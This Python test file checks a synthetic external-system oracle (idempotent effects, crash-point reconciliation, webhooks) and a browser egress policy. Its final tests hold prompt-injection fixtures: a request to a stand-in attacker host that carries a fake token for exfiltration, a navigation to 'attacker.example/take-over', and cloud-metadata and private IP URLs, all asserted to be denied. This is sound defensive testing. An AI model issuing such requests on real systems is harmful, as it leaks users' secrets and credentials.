"""Conformance oracles for the RXP-GATE-D synthetic external-system seam.

The seam is a deterministic, in-memory oracle over five synthetic external
systems, holding no database, transport or Platform handle. What is asserted
is its own contract:

- an effect's identity is stable and business-level, so a duplicate dispatch
  of the same intent replays a completed effect and never creates a second
  logical effect;
- each of the five crash points resolves to exactly the reconciliation state
  the seam's contract promises for it;
- an effect left ``UNKNOWN`` or ``PARTIAL`` fails closed -- it is never
  retried until an explicit proof resolves it, and only ``NOT_APPLIED`` is a
  retryable state;
- reconciling the current attempt settles it, a contradicting reconcile of an
  already-terminal attempt is refused, and a proof naming an attempt not yet
  reached is refused;
- a late proof naming a superseded attempt is retained as audit evidence and
  never overwrites the current attempt's result;
- a duplicate webhook delivery replays its first result and never resolves
  the underlying effect twice.

RXP-GATE-D, second bounded half -- browser session lifecycle and network
egress:

- a browser session is acquired under exactly one owner and positive fence,
  and a stale owner/fence action or release is refused;
- release is idempotent for the owner/fence that disposed the session, and
  leaves no active session for anyone else;
- leak detection names every acquired session not disposed, and reports none
  for a clean lifecycle;
- the network policy admits only an explicitly allowlisted HTTPS origin or
  ordinary same-origin navigation, and denies everything else -- arbitrary
  domains, cross-origin redirects, loopback/private/link-local/metadata and
  direct-IP destinations, non-HTTPS schemes, and the categorically
  non-navigable kinds (websocket, download, child-process egress, proxy
  bypass);
- a denial is retained as host/kind/reason evidence only, never the request
  itself, so a prompt-injection fixture attempting secret exfiltration or
  navigation to an attacker origin is denied without a secret value ever
  being stored.
"""

from __future__ import annotations

import pytest
from omnivia_core_runtime.execution.profile import (
    ExecutionContractError,
    ExecutionRefused,
)
from omnivia_core_runtime.execution.synthetic import (
    CRASH_AFTER_INTENT,
    CRASH_AFTER_PROVIDER_COMMIT,
    CRASH_BEFORE_INTENT,
    CRASH_BEFORE_RECEIPT_APPEND,
    CRASH_DURING_DISPATCH,
    CRASH_NONE,
    CRASH_POINTS,
    NETWORK_ALLOW,
    NETWORK_DECISIONS,
    NETWORK_DENY,
    NETWORK_KIND_CHILD_PROCESS_EGRESS,
    NETWORK_KIND_DOWNLOAD,
    NETWORK_KIND_NAVIGATION,
    NETWORK_KIND_PROXY_BYPASS,
    NETWORK_KIND_REDIRECT,
    NETWORK_KIND_WEBSOCKET,
    NETWORK_KINDS,
    RECONCILE_APPLIED,
    RECONCILE_NOT_APPLIED,
    RECONCILE_PARTIAL,
    RECONCILE_STATES,
    RECONCILE_UNKNOWN,
    SYSTEM_ACCOUNTING,
    SYSTEM_CRM,
    SYSTEM_EMAIL,
    SYSTEM_STORAGE,
    SYSTEM_WEBHOOK,
    SYSTEMS,
    EffectIntent,
    NetworkRequest,
    SyntheticBrowserSessionOracle,
    SyntheticExternalOracle,
    SyntheticNetworkPolicy,
    WebhookEvent,
)


def intent(system: str = SYSTEM_CRM, **overrides: str) -> EffectIntent:
    fields: dict[str, str] = {
        "system": system,
        "operation": "upsert.contact",
        "external_id": "contact-1",
    }
    fields.update(overrides)
    return EffectIntent(**fields)  # type: ignore[arg-type]


# --------------------------------------------------------------------------
# Vocabulary
# --------------------------------------------------------------------------


def test_five_systems_declared() -> None:
    assert SYSTEMS == {
        SYSTEM_CRM,
        SYSTEM_EMAIL,
        SYSTEM_ACCOUNTING,
        SYSTEM_STORAGE,
        SYSTEM_WEBHOOK,
    }


def test_unknown_system_is_refused() -> None:
    with pytest.raises(ExecutionContractError):
        intent(system="NOT_A_SYSTEM")


def test_reconcile_states_are_the_four_named() -> None:
    assert RECONCILE_STATES == {
        RECONCILE_APPLIED,
        RECONCILE_NOT_APPLIED,
        RECONCILE_PARTIAL,
        RECONCILE_UNKNOWN,
    }


# --------------------------------------------------------------------------
# Effect identity and duplicate dispatch
# --------------------------------------------------------------------------


def test_effect_key_is_stable_across_equal_intents() -> None:
    assert intent().effect_key == intent().effect_key


def test_effect_key_differs_across_distinct_identity() -> None:
    assert intent().effect_key != intent(external_id="contact-2").effect_key
    assert intent().effect_key != intent(system=SYSTEM_EMAIL).effect_key


def test_duplicate_dispatch_of_completed_effect_replays_without_a_new_attempt() -> None:
    oracle = SyntheticExternalOracle()
    first = oracle.dispatch(intent())
    second = oracle.dispatch(intent())
    assert first.state == RECONCILE_APPLIED
    assert second == first
    assert second.attempt == 1
    assert len(oracle.history(intent().effect_key)) == 1


# --------------------------------------------------------------------------
# Crash points
# --------------------------------------------------------------------------


def test_crash_before_intent_records_nothing() -> None:
    oracle = SyntheticExternalOracle()
    with pytest.raises(ExecutionRefused):
        oracle.dispatch(intent(), crash_point=CRASH_BEFORE_INTENT)
    assert oracle.current(intent().effect_key) is None


def test_crash_after_intent_is_an_explicit_absence_proof() -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=CRASH_AFTER_INTENT)
    assert record.state == RECONCILE_NOT_APPLIED
    assert record.receipt_ref is None


@pytest.mark.parametrize(
    "crash_point", [CRASH_DURING_DISPATCH, CRASH_AFTER_PROVIDER_COMMIT]
)
def test_crash_during_or_after_commit_leaves_uncertainty(crash_point: str) -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=crash_point)
    assert record.state in (RECONCILE_UNKNOWN, RECONCILE_PARTIAL)


def test_crash_during_dispatch_is_unknown() -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=CRASH_DURING_DISPATCH)
    assert record.state == RECONCILE_UNKNOWN


def test_crash_after_provider_commit_is_partial() -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=CRASH_AFTER_PROVIDER_COMMIT)
    assert record.state == RECONCILE_PARTIAL


def test_crash_before_receipt_append_is_partial_with_evidence() -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=CRASH_BEFORE_RECEIPT_APPEND)
    assert record.state == RECONCILE_PARTIAL
    assert record.receipt_ref is not None


def test_no_crash_completes_with_a_receipt() -> None:
    oracle = SyntheticExternalOracle()
    record = oracle.dispatch(intent(), crash_point=CRASH_NONE)
    assert record.state == RECONCILE_APPLIED
    assert record.receipt_ref is not None


def test_unknown_crash_point_is_refused() -> None:
    with pytest.raises(ExecutionContractError):
        SyntheticExternalOracle().dispatch(intent(), crash_point="NOT_A_CRASH_POINT")


def test_crash_points_cover_the_five_named_plus_none() -> None:
    assert CRASH_POINTS == {
        CRASH_NONE,
        CRASH_BEFORE_INTENT,
        CRASH_AFTER_INTENT,
        CRASH_DURING_DISPATCH,
        CRASH_AFTER_PROVIDER_COMMIT,
        CRASH_BEFORE_RECEIPT_APPEND,
    }


# --------------------------------------------------------------------------
# Retry: fail closed except from an explicit absence proof
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "crash_point", [CRASH_DURING_DISPATCH, CRASH_AFTER_PROVIDER_COMMIT, CRASH_BEFORE_RECEIPT_APPEND]
)
def test_retry_is_blocked_while_uncertain(crash_point: str) -> None:
    oracle = SyntheticExternalOracle()
    oracle.dispatch(intent(), crash_point=crash_point)
    with pytest.raises(ExecutionRefused):
        oracle.dispatch(intent())


def test_retry_is_admitted_after_explicit_absence_proof() -> None:
    oracle = SyntheticExternalOracle()
    oracle.dispatch(intent(), crash_point=CRASH_AFTER_INTENT)
    retried = oracle.dispatch(intent())
    assert retried.attempt == 2
    assert retried.state == RECONCILE_APPLIED


def test_retry_after_reconcile_resolves_unknown_to_not_applied() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    first = oracle.dispatch(intent(), crash_point=CRASH_DURING_DISPATCH)
    oracle.reconcile(key, first.attempt, RECONCILE_NOT_APPLIED)
    retried = oracle.dispatch(intent())
    assert retried.attempt == 2
    assert retried.state == RECONCILE_APPLIED


def test_reconcile_to_partial_still_blocks_retry() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    first = oracle.dispatch(intent(), crash_point=CRASH_DURING_DISPATCH)
    oracle.reconcile(key, first.attempt, RECONCILE_PARTIAL)
    with pytest.raises(ExecutionRefused):
        oracle.dispatch(intent())


# --------------------------------------------------------------------------
# Reconciliation: current attempt, conflicts, unreached attempts
# --------------------------------------------------------------------------


def test_reconcile_unknown_effect_is_refused() -> None:
    oracle = SyntheticExternalOracle()
    with pytest.raises(ExecutionRefused):
        oracle.reconcile(intent().effect_key, 1, RECONCILE_APPLIED)


def test_reconcile_settles_current_attempt() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    record = oracle.dispatch(intent(), crash_point=CRASH_AFTER_PROVIDER_COMMIT)
    resolved = oracle.reconcile(key, record.attempt, RECONCILE_APPLIED)
    assert resolved.state == RECONCILE_APPLIED
    assert oracle.current(key) == resolved


def test_reconcile_agreeing_with_terminal_state_is_a_no_op() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    record = oracle.dispatch(intent())
    resolved = oracle.reconcile(key, record.attempt, RECONCILE_APPLIED)
    assert resolved == record


def test_reconcile_contradicting_terminal_state_is_refused() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    record = oracle.dispatch(intent())
    with pytest.raises(ExecutionRefused):
        oracle.reconcile(key, record.attempt, RECONCILE_NOT_APPLIED)


def test_reconcile_naming_an_unreached_attempt_is_refused() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    record = oracle.dispatch(intent(), crash_point=CRASH_DURING_DISPATCH)
    with pytest.raises(ExecutionRefused):
        oracle.reconcile(key, record.attempt + 1, RECONCILE_APPLIED)


def test_reconcile_rejects_unknown_as_an_asserted_outcome() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    record = oracle.dispatch(intent(), crash_point=CRASH_DURING_DISPATCH)
    with pytest.raises(ExecutionContractError):
        oracle.reconcile(key, record.attempt, RECONCILE_UNKNOWN)


# --------------------------------------------------------------------------
# Late results from a superseded attempt: audit only, never an overwrite
# --------------------------------------------------------------------------


def test_late_confirmation_of_a_superseded_attempt_does_not_overwrite_current() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    stale = oracle.dispatch(intent(), crash_point=CRASH_AFTER_INTENT)
    current = oracle.dispatch(intent())
    assert current.attempt == stale.attempt + 1
    result = oracle.reconcile(key, stale.attempt, RECONCILE_APPLIED)
    assert result == current
    assert oracle.current(key) == current


def test_late_confirmation_is_retained_as_audit_evidence() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    stale = oracle.dispatch(intent(), crash_point=CRASH_AFTER_INTENT)
    oracle.dispatch(intent())
    oracle.reconcile(key, stale.attempt, RECONCILE_APPLIED)
    audit = oracle.audit_trail(key)
    assert len(audit) == 1
    assert audit[0].attempt == stale.attempt
    assert audit[0].state == RECONCILE_APPLIED


# --------------------------------------------------------------------------
# Webhooks: duplicate delivery never resolves the effect twice
# --------------------------------------------------------------------------


def test_webhook_resolves_the_current_attempt() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    oracle.dispatch(intent(), crash_point=CRASH_AFTER_PROVIDER_COMMIT)
    event = WebhookEvent(SYSTEM_WEBHOOK, "delivery-1", key, RECONCILE_APPLIED)
    result = oracle.receive_webhook(event)
    assert result.state == RECONCILE_APPLIED


def test_duplicate_webhook_delivery_replays_without_re_resolving() -> None:
    oracle = SyntheticExternalOracle()
    key = intent().effect_key
    oracle.dispatch(intent(), crash_point=CRASH_AFTER_PROVIDER_COMMIT)
    event = WebhookEvent(SYSTEM_WEBHOOK, "delivery-1", key, RECONCILE_APPLIED)
    first = oracle.receive_webhook(event)
    second = oracle.receive_webhook(event)
    assert second == first
    # A duplicate delivery asserting a different outcome still replays the
    # first result rather than re-resolving the effect a second time.
    contradicting = WebhookEvent(SYSTEM_WEBHOOK, "delivery-1", key, RECONCILE_NOT_APPLIED)
    assert oracle.receive_webhook(contradicting) == first


def test_webhook_for_unknown_effect_is_refused() -> None:
    oracle = SyntheticExternalOracle()
    event = WebhookEvent(SYSTEM_WEBHOOK, "delivery-1", intent().effect_key, RECONCILE_APPLIED)
    with pytest.raises(ExecutionRefused):
        oracle.receive_webhook(event)


def test_two_systems_never_collide_on_the_same_external_id() -> None:
    oracle = SyntheticExternalOracle()
    crm = oracle.dispatch(intent(system=SYSTEM_CRM))
    email = oracle.dispatch(intent(system=SYSTEM_EMAIL))
    assert crm.effect_key != email.effect_key
    assert oracle.current(crm.effect_key) is not None
    assert oracle.current(email.effect_key) is not None


# --------------------------------------------------------------------------
# Browser session lifecycle: single owner, positive fence, leak detection
# --------------------------------------------------------------------------


def test_acquire_grants_a_positive_fence_to_one_owner() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    assert session.owner == "owner-a"
    assert session.fence == 1
    assert session.disposed is False


def test_acquire_while_held_by_another_owner_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    oracle.acquire("session-1", "owner-a")
    with pytest.raises(ExecutionRefused):
        oracle.acquire("session-1", "owner-b")


def test_acquire_after_disposal_advances_the_fence() -> None:
    oracle = SyntheticBrowserSessionOracle()
    first = oracle.acquire("session-1", "owner-a")
    oracle.release("session-1", "owner-a", first.fence)
    second = oracle.acquire("session-1", "owner-b")
    assert second.fence == first.fence + 1


def test_stale_owner_action_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    with pytest.raises(ExecutionRefused):
        oracle.active("session-1", "owner-b", session.fence)


def test_stale_fence_action_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    with pytest.raises(ExecutionRefused):
        oracle.active("session-1", "owner-a", session.fence + 1)


def test_stale_owner_release_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    with pytest.raises(ExecutionRefused):
        oracle.release("session-1", "owner-b", session.fence)


def test_stale_fence_release_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    with pytest.raises(ExecutionRefused):
        oracle.release("session-1", "owner-a", session.fence + 1)


def test_release_is_idempotent_for_the_disposing_owner_and_fence() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    first = oracle.release("session-1", "owner-a", session.fence)
    second = oracle.release("session-1", "owner-a", session.fence)
    assert first == second
    assert first.disposed is True


def test_release_after_disposal_under_a_different_owner_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    oracle.release("session-1", "owner-a", session.fence)
    with pytest.raises(ExecutionRefused):
        oracle.release("session-1", "owner-b", session.fence)


def test_release_leaves_no_active_session() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    oracle.release("session-1", "owner-a", session.fence)
    with pytest.raises(ExecutionRefused):
        oracle.active("session-1", "owner-a", session.fence)


def test_release_of_unknown_session_is_refused() -> None:
    oracle = SyntheticBrowserSessionOracle()
    with pytest.raises(ExecutionRefused):
        oracle.release("no-such-session", "owner-a", 1)


def test_leaked_reports_every_acquired_session_not_disposed() -> None:
    oracle = SyntheticBrowserSessionOracle()
    oracle.acquire("session-1", "owner-a")
    session2 = oracle.acquire("session-2", "owner-b")
    oracle.release("session-2", "owner-b", session2.fence)
    assert oracle.leaked() == ("session-1",)


def test_clean_lifecycle_reports_no_leaks() -> None:
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    oracle.release("session-1", "owner-a", session.fence)
    assert oracle.leaked() == ()


def test_cancellation_leaves_a_session_disposed_or_detected_as_leaked() -> None:
    """Simulate a cancel/restart: whichever path is taken, nothing is silently active."""
    oracle = SyntheticBrowserSessionOracle()
    session = oracle.acquire("session-1", "owner-a")
    # Simulated crash: the caller never releases. The session must show up as
    # leaked rather than silently remaining active and unaccounted for.
    assert "session-1" in oracle.leaked()
    with pytest.raises(ExecutionRefused):
        oracle.acquire("session-1", "owner-b")
    # A restart that does clean up disposes it and clears the leak.
    oracle.release("session-1", "owner-a", session.fence)
    assert oracle.leaked() == ()


# --------------------------------------------------------------------------
# Network policy: allowlisted HTTPS origins and same-origin navigation
# --------------------------------------------------------------------------


def test_network_kinds_cover_the_six_named() -> None:
    assert NETWORK_KINDS == {
        NETWORK_KIND_NAVIGATION,
        NETWORK_KIND_REDIRECT,
        NETWORK_KIND_WEBSOCKET,
        NETWORK_KIND_DOWNLOAD,
        NETWORK_KIND_CHILD_PROCESS_EGRESS,
        NETWORK_KIND_PROXY_BYPASS,
    }


def test_network_decisions_are_allow_and_deny() -> None:
    assert NETWORK_DECISIONS == {NETWORK_ALLOW, NETWORK_DENY}


def test_allowlisted_https_origin_is_allowed() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    request = NetworkRequest(NETWORK_KIND_NAVIGATION, "https://example.com/path")
    decision = policy.evaluate(request)
    assert decision.decision == NETWORK_ALLOW
    assert decision.host == "example.com"


def test_same_origin_navigation_is_allowed_without_the_allowlist() -> None:
    policy = SyntheticNetworkPolicy(
        ("example.com",), trusted_current_https_origins=("app.example.com",)
    )
    request = NetworkRequest(
        NETWORK_KIND_NAVIGATION,
        "https://app.example.com/next",
        source_origin="app.example.com",
    )
    decision = policy.evaluate(request)
    assert decision.decision == NETWORK_ALLOW
    assert decision.reason == "same_origin_navigation"


def test_self_claimed_untrusted_source_origin_cannot_allow_navigation() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    request = NetworkRequest(
        NETWORK_KIND_NAVIGATION,
        "https://attacker.example/",
        source_origin="attacker.example",
    )
    decision = policy.evaluate(request)
    assert decision.decision == NETWORK_DENY
    assert decision.reason == "origin_not_allowlisted"
    assert decision.host == "attacker.example"


@pytest.mark.parametrize(
    "trusted_origin",
    [
        "not a url",
        "localhost",
        "127.0.0.1",
        "169.254.169.254",
        "10.0.0.5",
        "192.168.1.1",
        "8.8.8.8",
    ],
)
def test_malformed_private_or_direct_ip_trusted_origins_are_rejected_at_construction(
    trusted_origin: str,
) -> None:
    with pytest.raises(ExecutionContractError):
        SyntheticNetworkPolicy(
            ("example.com",), trusted_current_https_origins=(trusted_origin,)
        )


def test_arbitrary_domain_is_denied() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    decision = policy.evaluate(
        NetworkRequest(NETWORK_KIND_NAVIGATION, "https://not-allowed.example.org/")
    )
    assert decision.decision == NETWORK_DENY
    assert decision.reason == "origin_not_allowlisted"


def test_cross_origin_redirect_not_independently_allowlisted_is_denied() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    decision = policy.evaluate(
        NetworkRequest(
            NETWORK_KIND_REDIRECT,
            "https://attacker.example/",
            source_origin="example.com",
        )
    )
    assert decision.decision == NETWORK_DENY
    assert decision.reason == "origin_not_allowlisted"


def test_redirect_to_an_independently_allowlisted_origin_is_allowed() -> None:
    policy = SyntheticNetworkPolicy(("example.com", "cdn.example.net"))
    decision = policy.evaluate(
        NetworkRequest(
            NETWORK_KIND_REDIRECT,
            "https://cdn.example.net/asset",
            source_origin="example.com",
        )
    )
    assert decision.decision == NETWORK_ALLOW


@pytest.mark.parametrize(
    "url",
    [
        "https://localhost/",
        "https://sub.localhost/",
        "https://127.0.0.1/",
        "https://169.254.169.254/latest/meta-data/",
        "https://10.0.0.5/",
        "https://192.168.1.1/",
        "https://8.8.8.8/",
    ],
)
def test_loopback_private_link_local_metadata_and_direct_ip_are_denied(url: str) -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    decision = policy.evaluate(NetworkRequest(NETWORK_KIND_NAVIGATION, url))
    assert decision.decision == NETWORK_DENY


def test_non_https_scheme_is_denied() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    decision = policy.evaluate(
        NetworkRequest(NETWORK_KIND_NAVIGATION, "http://example.com/")
    )
    assert decision.decision == NETWORK_DENY
    assert decision.reason == "non_https_scheme"


@pytest.mark.parametrize(
    "kind",
    [
        NETWORK_KIND_WEBSOCKET,
        NETWORK_KIND_DOWNLOAD,
        NETWORK_KIND_CHILD_PROCESS_EGRESS,
        NETWORK_KIND_PROXY_BYPASS,
    ],
)
def test_categorically_non_navigable_kinds_are_denied(kind: str) -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    decision = policy.evaluate(NetworkRequest(kind, "https://example.com/"))
    assert decision.decision == NETWORK_DENY
    assert decision.reason == "kind_not_navigable"


def test_prompt_injection_secret_exfiltration_is_denied_without_storing_the_secret() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    secret = "sk-super-secret-value-do-not-leak"
    decision = policy.evaluate(
        NetworkRequest(
            NETWORK_KIND_NAVIGATION,
            f"https://attacker.example/exfil?token={secret}",
        )
    )
    assert decision.decision == NETWORK_DENY
    assert decision.host == "attacker.example"
    assert policy.denials == (decision,)
    for denial in policy.denials:
        assert secret not in denial.host
        assert secret not in denial.reason
        assert not hasattr(denial, "url")


def test_prompt_injection_attacker_navigation_is_retained_as_denial_evidence() -> None:
    policy = SyntheticNetworkPolicy(("example.com",))
    policy.evaluate(
        NetworkRequest(NETWORK_KIND_NAVIGATION, "https://attacker.example/take-over")
    )
    policy.evaluate(NetworkRequest(NETWORK_KIND_NAVIGATION, "https://example.com/"))
    denials = policy.denials
    assert len(denials) == 1
    assert denials[0].host == "attacker.example"
    assert denials[0].decision == NETWORK_DENY
